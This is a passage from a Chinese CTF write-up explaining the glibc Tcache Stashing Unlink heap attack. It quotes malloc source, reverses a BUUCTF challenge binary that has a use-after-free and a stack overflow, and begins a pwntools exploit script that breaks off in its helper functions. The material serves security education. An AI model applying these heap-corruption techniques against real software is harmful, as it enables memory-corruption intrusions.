class="headerlink" title="攻击目标"></a>攻击目标</h4><ol><li>向任意指定位置写入指定值。</li><li>向任意地址分配一个Chunk。</li></ol><h4 id="攻击前提"><a href="#攻击前提" class="headerlink" title="攻击前提"></a>攻击前提</h4><ol><li>能控制 Small Bin Chunk 的 bk 指针。</li><li>程序可以越过Tache取Chunk。(使用calloc即可做到)</li><li>程序至少可以分配两种不同大小且大小为unsorted bin的Chunk。</li></ol><h4 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h4><p>我们首先分析<code>House of Lore Attack</code>中所忽视的Tcache相关代码。</p><figure class="highlight xl"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs xl">#<span class="hljs-keyword">if</span> USE_TCACHE <span class="hljs-comment">//如果程序启用了Tcache</span><br>        <span class="hljs-comment">/* While we're here, if we see other chunks of the same size,</span><br><span class="hljs-comment">        stash them in the tcache.  */</span><br>        <span class="hljs-comment">//遍历整个smallbin，获取相同size的free chunk</span><br>        size_t tc_idx = csize2tidx (nb);<br>        <span class="hljs-keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)<br>        {<br>            mchunkptr tc_victim;<br>            <span class="hljs-comment">/* While bin not empty and tcache not full, copy chunks over.  */</span><br>            <span class="hljs-comment">//判定Tcache的size链表是否已满，并且取出smallbin的末尾Chunk。</span><br>            <span class="hljs-comment">//验证取出的Chunk是否为Bin本身（Smallbin是否已空）</span><br>            <span class="hljs-function"><span class="hljs-title">while</span> ( tcache-&gt;</span>counts[tc_idx] &lt; mp_.tcache_count<br>                   &amp;&amp; (tc_victim = last (bin) ) != bin)<br>            {<br>                <span class="hljs-comment">//如果成功获取了Chunk</span><br>                <span class="hljs-keyword">if</span> (tc_victim != <span class="hljs-number">0</span>)<br>                {<br>                    <span class="hljs-comment">// 获取 small bin 中倒数第二个 chunk 。</span><br>                    <span class="hljs-function"><span class="hljs-title">bck</span> = tc_victim-&gt;</span>bk;<br>                    <span class="hljs-comment">//设置标志位</span><br>                    set_inuse_bit_at_offset (tc_victim, nb);<br>                    <span class="hljs-comment">// 如果不是 main_arena，设置对应的标志</span><br>                    <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>                        set_non_main_arena (tc_victim);<br>                    <span class="hljs-comment">//取出最后一个Chunk</span><br>                    <span class="hljs-function"><span class="hljs-title">bin</span>-&gt;</span>bk = bck;<br>                    <span class="hljs-function"><span class="hljs-title">bck</span>-&gt;</span>fd = bin;<br>                    <span class="hljs-comment">//将其放入到Tcache中</span><br>                    tcache_put (tc_victim, tc_idx);<br>                }<br>            }<br>        }<br>#endif<br></code></pre></td></tr></tbody></table></figure><p>此处我们发现了一个很关键的情况！我们在此处没有经过<code>House of Lore</code>中必须经过的检查：</p><figure class="highlight reasonml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-comment">// 检查 bck-&gt;fd 是不是 victim，防止伪造</span><br><span class="hljs-keyword">if</span> ( <span class="hljs-constructor">__glibc_unlikely( <span class="hljs-params">bck</span>-&gt;<span class="hljs-params">fd</span> != <span class="hljs-params">victim</span> )</span> )<br>    malloc_printerr (<span class="hljs-string">"malloc(): smallbin double linked list corrupted"</span>);<br></code></pre></td></tr></tbody></table></figure><p>但是此处又有了矛盾的地方！</p><p><strong>首先，在引入Tcache后，Tcache中的Chunk拥有绝对优先权，我们不能越过Tcache向SmallBin中填入Chunk，也不能越过Tcache从SmallBin中取出Chunk。（除非Tcache已经处于FULL状态）</strong></p><p>然后，我们如果要在这里启动攻击，那么要求<code>SmallBin</code>中至少有两个Chunk(否则无法进入While中的if语句块)，<strong>同时要求Tcache处于非空状态。</strong></p><p>那样就产生了矛盾，导致这个漏洞看似无法利用。</p><p>但是<code>calloc</code>函数有一个很有趣的特性，它不会从<code>Tcache</code>拿<code>Chunk</code>，因此可以越过第一条矛盾“不能越过<code>Tcache</code>从<code>SmallBin</code>中取出<code>Chunk</code>”。</p><p>然后是<code>Unsorted Bin</code>的**<code>last remainder</code>**基址，当申请的Chunk大于<code>Unsorted Bin</code>中Chunk的大小且其为<code>Unsorted Bin</code>中的唯一<code>Chunk</code>时，该<code>Chunk</code>不会进入<code>Tcache</code>。</p><p>同时，我们来分析<code>tcache_put</code>函数</p><figure class="highlight xl"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs xl">static __always_inline void tcache_put (mchunkptr chunk, size_t tc_idx)<br>{<br>  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);<br>  assert (tc_idx &lt; TCACHE_MAX_BINS);<br><br>  <span class="hljs-comment">/* Mark this chunk as "in the tcache" so the test in _int_free will</span><br><span class="hljs-comment">     detect a double free.  */</span><br>  <span class="hljs-function"><span class="hljs-title">e</span>-&gt;</span>key = tcache;<br><br>  <span class="hljs-function"><span class="hljs-title">e</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">next</span> = tcache-&gt;</span>entries[tc_idx];<br>  <span class="hljs-function"><span class="hljs-title">tcache</span>-&gt;</span>entries[tc_idx] = e;<br>  ++(<span class="hljs-function"><span class="hljs-title">tcache</span>-&gt;</span>counts[tc_idx]);<br>}<br></code></pre></td></tr></tbody></table></figure><p>可以发现，<code>tcache_put</code>函数没有做任何的安全检查。</p><p>那么，当Tcache存在两个以上的空位时，程序会将我们的fake chunk置入Tcache。</p><h1>例题 BUUCTF-[2020 新春红包题]3</h1><p class='item-img' data-src='https://img-blog.csdnimg.cn/1e5652dfa82c4d62aa48c5dfde30cbd7.png?ynotemdtimestamp=1663776368288'><img src="https://img-blog.csdnimg.cn/1e5652dfa82c4d62aa48c5dfde30cbd7.png?ynotemdtimestamp=1663776368288" alt="在这里插入图片描述"><br>未开启canary保护，可能存在栈溢出</p><h2 id="main函数"><a href="#main函数" class="headerlink" title="main函数"></a>main函数</h2><p>程序实现四个功能，增，删，查，改，还有一个栈溢出的函数</p><figure class="highlight armasm"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">void</span> __fastcall __noreturn main(char *<span class="hljs-built_in">a1</span>, char **<span class="hljs-built_in">a2</span>, char **<span class="hljs-built_in">a3</span>)<br>{<br>  char <span class="hljs-built_in">v3</span>[<span class="hljs-number">268</span>]<span class="hljs-comment">; // [rsp+0h] [rbp-110h] BYREF</span><br>  int <span class="hljs-built_in">v4</span><span class="hljs-comment">; // [rsp+10Ch] [rbp-4h]</span><br><br>  <span class="hljs-built_in">v4</span> = <span class="hljs-number">0</span><span class="hljs-comment">;</span><br>  sub_11D5()<span class="hljs-comment">;</span><br>  sub_1450()<span class="hljs-comment">;</span><br>  sub_1269()<span class="hljs-comment">;</span><br>  <span class="hljs-meta">while</span> ( <span class="hljs-number">1</span> )<br>  {<br>    <span class="hljs-meta">while</span> ( <span class="hljs-number">1</span> )<br>    {<br>      <span class="hljs-meta">while</span> ( <span class="hljs-number">1</span> )<br>      {<br>        menu()<span class="hljs-comment">;</span><br>        <span class="hljs-built_in">v4</span> = readd()<span class="hljs-comment">;</span><br>        <span class="hljs-meta">if</span> ( <span class="hljs-built_in">v4</span> != <span class="hljs-number">3</span> )<br>          break<span class="hljs-comment">;</span><br>        <span class="hljs-built_in">a1</span> = <span class="hljs-built_in">v3</span><span class="hljs-comment">;</span><br>        edit(<span class="hljs-built_in">v3</span>, <span class="hljs-built_in">a2</span>)<span class="hljs-comment">;</span><br>      }<br>      <span class="hljs-meta">if</span> ( <span class="hljs-built_in">v4</span> &gt; <span class="hljs-number">3</span> )<br>        break<span class="hljs-comment">;</span><br>      <span class="hljs-meta">if</span> ( <span class="hljs-built_in">v4</span> == <span class="hljs-number">1</span> )<br>      {<br>        <span class="hljs-meta">if</span> ( x1c &lt;= <span class="hljs-number">0</span> )<br>          exitt()<span class="hljs-comment">;</span><br>        <span class="hljs-built_in">a1</span> = <span class="hljs-built_in">v3</span><span class="hljs-comment">;</span><br>        add(<span class="hljs-built_in">v3</span>)<span class="hljs-comment">;</span><br>        --x1c<span class="hljs-comment">;</span><br>      }<br>      <span class="hljs-meta">else</span><br>      {<br>        <span class="hljs-meta">if</span> ( <span class="hljs-built_in">v4</span> != <span class="hljs-number">2</span> )<br>          goto LABEL_19<span class="hljs-comment">;</span><br>        <span class="hljs-built_in">a1</span> = <span class="hljs-built_in">v3</span><span class="hljs-comment">;</span><br>        delete(<span class="hljs-built_in">v3</span>)<span class="hljs-comment">;</span><br>      }<br>    }<br>    <span class="hljs-meta">if</span> ( <span class="hljs-built_in">v4</span> == <span class="hljs-number">5</span> )<br>      exitt()<span class="hljs-comment">;</span><br>    <span class="hljs-meta">if</span> ( <span class="hljs-built_in">v4</span> &lt; <span class="hljs-number">5</span> )<br>    {<br>      <span class="hljs-built_in">a1</span> = <span class="hljs-built_in">v3</span><span class="hljs-comment">;</span><br>      show(<span class="hljs-built_in">v3</span>)<span class="hljs-comment">;</span><br>    }<br>    <span class="hljs-meta">else</span><br>    {<br>      <span class="hljs-meta">if</span> ( <span class="hljs-built_in">v4</span> != <span class="hljs-number">666</span> )<br><span class="hljs-symbol">LABEL_19:</span><br>        exitt()<span class="hljs-comment">;</span><br>      stack_attack(<span class="hljs-built_in">a1</span>, <span class="hljs-built_in">a2</span>)<span class="hljs-comment">;</span><br>    }<br>  }<br>}<br></code></pre></td></tr></tbody></table></figure><h2 id="add函数"><a href="#add函数" class="headerlink" title="add函数"></a>add函数</h2><p>申请chunk，会指定chunk的序号，最大为16，且只能申请四种chunk，1.0x10 2.0xf0 3.0x300 4.0x400，并且是calloc函数分配堆块，chunk不会从tcache bin中取。</p><figure class="highlight arduino"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-type">int</span> __fastcall <span class="hljs-title">sub_1515</span><span class="hljs-params">(__int64 a1)</span></span><br><span class="hljs-function"></span>{<br>  <span class="hljs-type">int</span> v2; <span class="hljs-comment">// [rsp+10h] [rbp-20h]</span><br>  <span class="hljs-type">int</span> v3; <span class="hljs-comment">// [rsp+14h] [rbp-1Ch]</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v4; <span class="hljs-comment">// [rsp+18h] [rbp-18h]</span><br>  <span class="hljs-type">int</span> size; <span class="hljs-comment">// [rsp+1Ch] [rbp-14h]</span><br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Please input the red packet idx: "</span>);<br>  v4 = <span class="hljs-built_in">readd</span>();<br>  <span class="hljs-keyword">if</span> ( v4 &gt; <span class="hljs-number">0x10</span> )<br>    <span class="hljs-built_in">exitt</span>();<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"How much do you want?(1.0x10 2.0xf0 3.0x300 4.0x400): "</span>);<br>  v3 = <span class="hljs-built_in">readd</span>();<br>  <span class="hljs-keyword">if</span> ( v3 == <span class="hljs-number">2</span> )<br>  {<br>    size = <span class="hljs-number">0xF0</span>;<br>  }<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( v3 &gt; <span class="hljs-number">2</span> )<br>  {<br>    <span class="hljs-keyword">if</span> ( v3 == <span class="hljs-number">3</span> )<br>    {<br>      size = <span class="hljs-number">0x300</span>;<br>    }<br>    <span class="hljs-keyword">else</span><br>    {<br>      <span class="hljs-keyword">if</span> ( v3 != <span class="hljs-number">4</span> )<br>        <span class="hljs-keyword">goto</span> LABEL_14;<br>      size = <span class="hljs-number">0x400</span>;<br>    }<br>  }<br>  <span class="hljs-keyword">else</span><br>  {<br>    <span class="hljs-keyword">if</span> ( v3 != <span class="hljs-number">1</span> )<br>    {<br>LABEL_14:<br>      size = <span class="hljs-number">0</span>;<br>      <span class="hljs-keyword">goto</span> LABEL_15;<br>    }<br>    size = <span class="hljs-number">16</span>;<br>  }<br>LABEL_15:<br>  <span class="hljs-keyword">if</span> ( size != <span class="hljs-number">0x10</span> &amp;&amp; size != <span class="hljs-number">0xF0</span> &amp;&amp; size != <span class="hljs-number">0x300</span> &amp;&amp; size != <span class="hljs-number">0x400</span> )<br>    <span class="hljs-built_in">exitt</span>();<br>  *(<span class="hljs-number">16LL</span> * v4 + a1) = <span class="hljs-built_in">calloc</span>(<span class="hljs-number">1uLL</span>, size);<br>  *(a1 + <span class="hljs-number">16LL</span> * v4 + <span class="hljs-number">8</span>) = size;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Please input content: "</span>);<br>  v2 = <span class="hljs-built_in">read</span>(<span class="hljs-number">0</span>, *(<span class="hljs-number">16LL</span> * v4 + a1), *(<span class="hljs-number">16LL</span> * v4 + a1 + <span class="hljs-number">8</span>));<br>  <span class="hljs-keyword">if</span> ( v2 &lt;= <span class="hljs-number">0</span> )<br>    <span class="hljs-built_in">exitt</span>();<br>  *(v2 - <span class="hljs-number">1LL</span> + *(<span class="hljs-number">16LL</span> * v4 + a1)) = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Done!"</span>);<br>}<br></code></pre></td></tr></tbody></table></figure><h2 id="delete函数"><a href="#delete函数" class="headerlink" title="delete函数"></a>delete函数</h2><p>存在UAF</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">int</span> __fastcall <span class="hljs-title">delete</span><span class="hljs-params">(__int64 a1)</span></span><br><span class="hljs-function"></span>{<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v2; <span class="hljs-comment">// [rsp+1Ch] [rbp-4h]</span><br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Please input the red packet idx: "</span>);<br>  v2 = <span class="hljs-built_in">readd</span>();<br>  <span class="hljs-keyword">if</span> ( v2 &gt; <span class="hljs-number">0x10</span> || !*(<span class="hljs-number">16LL</span> * v2 + a1) )<br>    <span class="hljs-built_in">exitt</span>();<br>  <span class="hljs-built_in">free</span>(*(<span class="hljs-number">16LL</span> * v2 + a1));                      <span class="hljs-comment">// uaf</span><br>                                                <span class="hljs-comment">// </span><br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Done!"</span>);<br>}<br></code></pre></td></tr></tbody></table></figure><h2 id="edit函数"><a href="#edit函数" class="headerlink" title="edit函数"></a>edit函数</h2><p>编辑的次数受qword_4010控制，qword_4010为1，只能编辑1次</p><figure class="highlight armasm"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">int</span> __fastcall sub_1740(__int64 <span class="hljs-built_in">a1</span>, __int64 <span class="hljs-built_in">a2</span>)<br>{<br>  void *<span class="hljs-built_in">v2</span><span class="hljs-comment">; // rsi</span><br>  int <span class="hljs-built_in">v4</span><span class="hljs-comment">; // [rsp+18h] [rbp-8h]</span><br>  unsigned int <span class="hljs-built_in">v5</span><span class="hljs-comment">; // [rsp+1Ch] [rbp-4h]</span><br><br>  <span class="hljs-meta">if</span> ( qword_4010 &lt;= <span class="hljs-number">0</span> )<br>    exitt(<span class="hljs-built_in">a1</span>, <span class="hljs-built_in">a2</span>)<span class="hljs-comment">;</span><br>  --qword_4010<span class="hljs-comment">;</span><br>  printf(<span class="hljs-string">"Please input the red packet idx: "</span>)<span class="hljs-comment">;</span><br>  <span class="hljs-built_in">v5</span> = readd()<span class="hljs-comment">;</span><br>  <span class="hljs-meta">if</span> ( <span class="hljs-built_in">v5</span> &gt; <span class="hljs-number">0x10</span> <span class="hljs-title">||</span> !*(<span class="hljs-number">16</span>LL * <span class="hljs-built_in">v5</span> + <span class="hljs-built_in">a1</span>) )<br>    exitt(<span class="hljs-string">"Please input the red packet idx: "</span>, <span class="hljs-built_in">a2</span>)<span class="hljs-comment">;</span><br>  printf(<span class="hljs-string">"Please input content: "</span>)<span class="hljs-comment">;</span><br>  <span class="hljs-built_in">v2</span> = *(<span class="hljs-number">16</span>LL * <span class="hljs-built_in">v5</span> + <span class="hljs-built_in">a1</span>)<span class="hljs-comment">;</span><br>  <span class="hljs-built_in">v4</span> = read(<span class="hljs-number">0</span>, <span class="hljs-built_in">v2</span>, *(<span class="hljs-number">16</span>LL * <span class="hljs-built_in">v5</span> + <span class="hljs-built_in">a1</span> + <span class="hljs-number">8</span>))<span class="hljs-comment">;</span><br>  <span class="hljs-meta">if</span> ( <span class="hljs-built_in">v4</span> &lt;= <span class="hljs-number">0</span> )<br>    exitt(<span class="hljs-number">0</span>LL, <span class="hljs-built_in">v2</span>)<span class="hljs-comment">;</span><br>  *(<span class="hljs-built_in">v4</span> - <span class="hljs-number">1</span>LL + *(<span class="hljs-number">16</span>LL * <span class="hljs-built_in">v5</span> + <span class="hljs-built_in">a1</span>)) = <span class="hljs-number">0</span><span class="hljs-comment">;</span><br>  return puts(<span class="hljs-string">"Done!"</span>)<span class="hljs-comment">;</span><br>}<br></code></pre></td></tr></tbody></table></figure><p class='item-img' data-src='https://img-blog.csdnimg.cn/01aa83610d4643709ea878d55a3f47e1.png?ynotemdtimestamp=1663776368288'><img src="https://img-blog.csdnimg.cn/01aa83610d4643709ea878d55a3f47e1.png?ynotemdtimestamp=1663776368288" alt="在这里插入图片描述"></p><h2 id="show函数"><a href="#show函数" class="headerlink" title="show函数"></a>show函数</h2><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">int</span> __fastcall <span class="hljs-title">sub_184E</span><span class="hljs-params">(__int64 a1)</span></span><br><span class="hljs-function"></span>{<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v2; <span class="hljs-comment">// [rsp+1Ch] [rbp-4h]</span><br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Please input the red packet idx: "</span>);<br>  v2 = <span class="hljs-built_in">readd</span>();<br>  <span class="hljs-keyword">if</span> ( v2 &gt; <span class="hljs-number">0x10</span> || !*(<span class="hljs-number">16LL</span> * v2 + a1) )<br>    <span class="hljs-built_in">exitt</span>();<br>  <span class="hljs-built_in">puts</span>(*(<span class="hljs-number">16LL</span> * v2 + a1));<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Done!"</span>);<br>}<br></code></pre></td></tr></tbody></table></figure><h2 id="栈溢出函数"><a href="#栈溢出函数" class="headerlink" title="栈溢出函数"></a>栈溢出函数</h2><p>执行栈溢出函数需要满足*(first_chunk + 2048)&gt; 0x7F0000000000且*(first_chunk + 2040) 和 *(first_chunk + 2056)值为0。first_chunk就是我们申请的第一个chunk。</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">ssize_t</span> <span class="hljs-title">sub_13BD</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>{<br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">128</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-80h] BYREF</span><br><br>  <span class="hljs-keyword">if</span> ( *(first_chunk + <span class="hljs-number">2048</span>) &lt;= <span class="hljs-number">0x7F0000000000</span>LL || *(first_chunk + <span class="hljs-number">2040</span>) || *(first_chunk + <span class="hljs-number">2056</span>) )<br>    <span class="hljs-built_in">exitt</span>();<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"You get red packet!"</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"What do you want to say?"</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">read</span>(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x90</span>uLL);<br>}<br></code></pre></td></tr></tbody></table></figure><h1>思路</h1><p>因为存在一个栈溢出的漏洞，我们可以使用堆ROP，而要想利用栈溢出漏洞需要将*(first_chunk + 2048)修改为一个大于0x7F0000000000的值，而*(first_chunk + 2040)和 *(first_chunk + 2056)本来就是0，保持不变即可。calloc函数分配堆块，chunk不会从tcache bin中取。程序至少可以分配两种不同大小且大小为unsorted bin的Chunk（0x300和0x400）。这里我们可以使用Tcache Stashing Unlink Attack。</p><h1>调试过程</h1><p>先把前面的写好</p><figure class="highlight vim"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs vim"># coding=utf-<span class="hljs-number">8</span><br>from pwn import *<br>context(endian=<span class="hljs-string">'little'</span>,os=<span class="hljs-string">'linux'</span>,arch=<span class="hljs-string">'amd64'</span>,log_level=<span class="hljs-string">'debug'</span>) <br><br><span class="hljs-keyword">sh</span> = process(<span class="hljs-string">'./RedPacket_SoEasyPwn1'</span>)<br>#sh = remote(<span class="hljs-string">'node4.buuoj.cn'</span>,<span class="hljs-string">'27283'</span>)<br><br>libc=ELF(<span class="hljs-string">"./libc-2.29.so"</span>)<br><br> <br> <br><br>s       = lambda data               :<span class="hljs-keyword">sh</span>.send(data)<br><span class="hljs-keyword">sa</span>      = lambda delim,data         :<span class="hljs-keyword">sh</span>.sendafter(delim, data)<br><span class="hljs-keyword">sl</span>      = lambda data               :<span class="hljs-keyword">sh</span>.sendline(data)<br><span class="hljs-keyword">sla</span>     = lambda delim,data         :<span class="hljs-keyword">sh</span>.sendlineafter(delim, data)<br>r       = lambda num=<span class="hljs-number">4096</span>           :<span class="hljs-keyword">sh</span>.recv(num)<br><span class="hljs-keyword">ru</span>      = lambda delims    :<span class="hljs-keyword">sh</span>.recvuntil(delims)<br>itr     = lambda                    :<span class="hljs-keyword">sh</span>.interactive()<br>uu32    = lambda data               :u32(data.ljust(<span class="hljs-number">4</span>,<span class="hljs-string">'\0'</span>))<br>uu64    = lambda data               :u64(data.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">'\0'</span>))<br>leak    = lambda name,addr          :<span class="hljs-built_in">log</span>.success(<span class="hljs-string">'{} = {:#x}'</span>.format(name, addr))<br><span class="hljs-keyword">lg</span>      = lambda address,data       :<span class="hljs-built_in">log</span>.success(<span class="hljs-string">'%s: '</span>%(address)+hex(data))<br>def dbg():<br>        gdb.attach(<span class="hljs-keyword">sh</span>)<br>        pause()<br> <br><br>def <span class="hljs-built_in">add</span>(<span class="hljs-built_in">index</span>,chunk_size_index,value):<br>    <span class="hljs-keyword">ru</span>(<span class="hljs-string">'Your input: '</span>)<br>    <span class="hljs-keyword">sl</span>(<span class="hljs-string">'1'</span>)<br>    <span class="hljs-keyword">ru</span>(<span class="hljs-string">'Please input the red packet idx: '</span>)<br>    <span class="hljs-keyword">sl</span>(str(<span class="hljs-built_in">index</span>))<br>    <span class="hljs-keyword">ru</span>(<span class="hljs-string">'How much do you want?(1.0x10 2.0xf0 3.0x300 4.0x400): '</span>)<br>    <span class="hljs-keyword">sl</span>(str(chunk_size_index))<br>    <span class="hljs-keyword">ru</span>(<span class="hljs-string">'Please input content: '</span>)<br>    <span class="hljs-keyword">sl</span>(value)<br><br>def free(<span class="hljs-built_in">index</span>):<br>    <span class="hljs-keyword">ru</span>(<span class="hljs-string">'Your input: '</span>)<br>    <span class="hljs-keyword">sl</span>(<span class="hljs-string">'2'</span>)<br>    <span class="hljs-keyword">ru</span>(<span class="hljs-string">'Please input the red packet idx: '</span>)<br>    <span class="hljs-keyword">sl</span>(str(<span class="hljs-built_in">index</span>))<br><br>def <span class="hljs-keyword">edit</span>(<span class="hljs-built_in">index</span>,value):<br>    <span class="hljs-keyword">ru</span>(<span class="hljs-string">'Your input: '</span>)<br>    <span class="hljs-keyword">sl</span>(<span class="hljs-string">'3'</span>)<br>    <span class="hljs-keyword">ru</span>(<span class="hljs-string">'Please input the red packet idx: '</span>)<br>    <span class="hljs-keyword">sl</span>(str(<span class="hljs-built_in">index</span>))<br>    <span class="hljs-keyword">ru</span>(<span class="hljs-string">'Please input content: '</span>)<br>    <span 